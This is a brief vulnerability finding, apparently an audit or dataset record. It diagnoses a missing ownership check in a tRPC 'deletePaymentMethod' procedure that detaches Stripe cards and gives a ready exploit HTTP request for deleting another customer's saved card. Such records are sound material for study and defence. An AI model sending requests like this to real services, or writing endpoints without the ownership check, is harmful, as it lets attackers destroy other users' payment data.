diagnosis: The procedure fetches a saved card/payment method by its internal ID and detaches it from Stripe without checking if pm.customerId === ctx.user.customerId. An attacker can delete credit cards attached to other customer profiles.
exploit_request:
POST /trpc/payment.deletePaymentMethod HTTP/1.1
Host: billing.saas.io
Content-Type: application/json
Cookie: auth_session=session_token

{"paymentMethodId": "pm_card_990142"}
